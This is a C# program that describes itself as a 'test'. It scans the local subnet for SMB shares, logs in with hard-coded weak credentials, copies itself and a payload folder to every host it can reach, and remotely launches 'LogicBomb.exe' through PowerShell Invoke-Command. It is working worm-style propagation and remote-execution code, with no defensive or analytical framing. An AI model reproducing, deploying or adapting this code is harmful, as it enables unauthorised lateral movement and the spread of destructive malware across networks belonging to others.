using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string EXECUTABLE_TO_RUN = "LogicBomb.exe";

    static async Task Main()
    {
        Console.WriteLine("Starting IP Range, SMB Scan, Self-Deployment, and Remote Execution Test...");
        Console.WriteLine("-----------------------------------");

        string localIP = GetLocalIPAddress();
        if (localIP == null)
        {
            Console.WriteLine("[ERROR] Could not detect local IP address.");
            return;
        }

        string baseIP = string.Join(".", localIP.Split('.').Take(3));
        Console.WriteLine($"Local IP Address detected: {localIP}");
        Console.WriteLine($"Scanning network: {baseIP}.1 - {baseIP}.254 for active SMB servers...");

        List<string> smbHosts = await FindSmbServersAsync(baseIP);

        if (smbHosts.Count == 0)
        {
            Console.WriteLine("[INFO] No SMB servers found. Exiting.");
            return;
        }

        Console.WriteLine($"[INFO] Found {smbHosts.Count} SMB host(s) with accessible shares.");

        string tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
        Console.WriteLine($"Preparing deployment package in temporary folder: {tempFolder}");
        PrepareDeploymentPackage(tempFolder);

        foreach (string ip in smbHosts)
        {
            string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
            Console.WriteLine($"Attempting SMB login on {remoteShareUNC}...");

            int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
            if (smbConnectResult == 0)
            {
                Console.WriteLine($"[SMB SUCCESS] Connected to {ip}. Copying deployment files...");
                await CopyFolderAsync(tempFolder, remoteShareUNC);
                Console.WriteLine($"[COPY OK] Files copied to {remoteShareUNC}");

                Console.WriteLine($"[REMOTE EXEC] Attempting to execute '{EXECUTABLE_TO_RUN}' on {ip}...");

                string remoteServerPathToExecutable = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{EXECUTABLE_TO_RUN}";

                bool executionSuccess = await ExecuteRemoteCommand(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);

                if (executionSuccess)
                {
                    Console.WriteLine($"[REMOTE EXEC SUCCESS] '{EXECUTABLE_TO_RUN}' executed successfully on {ip}");
                }
                else
                {
                    Console.WriteLine($"[REMOTE EXEC FAILED] Could not execute '{EXECUTABLE_TO_RUN}' on {ip}. Ensure PowerShell Remoting is enabled and credentials are correct.");
                }

                DisconnectFromRemoteShare(remoteShareUNC);
            }
            else
            {
                Console.WriteLine($"[SMB FAILED] {ip} - Error Code: {smbConnectResult}");
            }
        }

        Console.WriteLine("-----------------------------------");
        Console.WriteLine("Scan, deployment, and remote execution complete.");
        Console.WriteLine($"[CLEANUP] Deleting temporary directory: {tempFolder}");
        Directory.Delete(tempFolder, true);

        Console.WriteLine("Press any key to exit.");
        Console.ReadKey();
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var pingTasks = new List<Task>();

        var semaphore = new SemaphoreSlim(50);
        for (int i = 1; i <= 254; i++)
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();

            pingTasks.Add(Task.Run(async () =>
            {
                try
                {
                    var ping = new Ping();
                    var reply = await ping.SendPingAsync(ip, 300);
                    if (reply.Status == IPStatus.Success)
                    {
                        string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                        int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);
                        if (result == 0)
                        {
                            Console.WriteLine($"[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
                            lock (activeHosts)
                            {
                                activeHosts.Add(ip);
                            }
                            DisconnectFromRemoteShare(smbPath);
                        }
                        else
                        {
                            Console.WriteLine($"[ACTIVE] {ip} - No SMB share or invalid credentials");
                        }
                    }
                }
                catch (PingException) { }
                catch (Exception ex) { Console.WriteLine($"[ERROR] {ip} - {ex.Message}"); }
                finally { semaphore.Release(); }
            }));
        }

        await Task.WhenAll(pingTasks);
        return activeHosts;
    }

    private static void PrepareDeploymentPackage(string tempFolder)
    {
        Directory.CreateDirectory(tempFolder);

        string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        File.Copy(exePath, Path.Combine(tempFolder, Path.GetFileName(exePath)), overwrite: true);

        string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);
        if (Directory.Exists(payloadFolder))
        {
            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME));
        }
        else
        {
            Console.WriteLine($"WARNING: '{PAYLOAD_FOLDER_NAME}' folder not found, skipping copy. Please ensure '{EXECUTABLE_TO_RUN}' is in a '{PAYLOAD_FOLDER_NAME}' folder next to this program.");
        }

        Console.WriteLine("Deployment package prepared successfully.");
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);

        foreach (string dir in Directory.GetDirectories(source))
            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
            await Task.Run(() => File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));

        foreach (string dir in Directory.GetDirectories(source))
            await CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }

    private static string GetLocalIPAddress()
    {
        var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
        return host.AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
    }

    private static async Task<bool> ExecuteRemoteCommand(string remoteIp, string username, string password, string commandToExecute)
    {
        string psScript = $"Start-Process -FilePath \"{commandToExecute}\"";
        string fullPsCommand = $"powershell.exe -Command \"& {{ Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ {psScript} }} }}\"";

        try
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-Command \"& {{ Invoke-Command -ComputerName {remoteIp} -Credential (New-Object System.Management.Automation.PSCredential('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))) -ScriptBlock {{ Start-Process -FilePath '{commandToExecute}' }} }}\"";

                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                Console.WriteLine($"[DEBUG] Executing PowerShell command: {process.StartInfo.Arguments}");

                process.Start();
                string output = await process.StandardOutput.ReadToEndAsync();
                string error = await process.StandardError.ReadToEndAsync();
                await Task.Run(() => process.WaitForExit(15000));

                if (process.ExitCode == 0)
                {
                    Console.WriteLine($"[DEBUG] Remote execution output: {output}");
                    return true;
                }
                else
                {
                    Console.WriteLine($"[ERROR] PowerShell process exited with code {process.ExitCode} for {remoteIp}.");
                    Console.WriteLine($"[ERROR] Standard Output: {output}");
                    Console.WriteLine($"[ERROR] Standard Error: {error}");
                    return false;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERROR] Exception during remote execution on {remoteIp}: {ex.Message}");
            return false;
        }
    }

    [DllImport("mpr.dll")]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll")]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE
        {
            dwType = 1,
            lpRemoteName = remotePath
        };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        WNetCancelConnection2(remotePath, 0, true);
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct NETRESOURCE
    {
        public int dwScope;
        public int dwType;
        public int dwDisplayType;
        public int dwUsage;
        public string lpLocalName;
        public string lpRemoteName;
        public string lpComment;
        public string lpProvider;
    }
}